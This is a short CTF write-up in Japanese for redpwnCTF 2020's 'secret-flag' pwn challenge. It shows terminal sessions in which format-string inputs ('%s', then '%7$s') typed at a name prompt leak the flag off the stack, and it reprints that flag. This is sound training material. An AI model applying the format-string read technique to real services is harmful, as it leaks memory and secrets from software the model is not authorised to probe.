# secret-flag:pwn:348pts
There's a super secret flag in printf that allows you to LEAK the data at an address??  
nc 2020.redpwnc.tf 31826  
[secret-flag](secret-flag)  

# Solution
ncすると名前を聞かれるようだ。  
```bash
$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
Satoki
Hello there: Satoki
```
ソースもなく適当な場所へret2できないので、書式文字列攻撃(format string attack)を狙う。  
`%s`の入力で以下のようになった。  
```bash
$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%s
Hello there: Hello there:
```
スタックに積まれたHello there:が出てきてしまっている。  
あとは`%n$s`でn番目まで遡ればよい。  
`%7$s`でフラグが現れた。  
```bash
$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%7$s
Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w}
```

## flag{n0t_s0_s3cr3t_f1ag_n0w}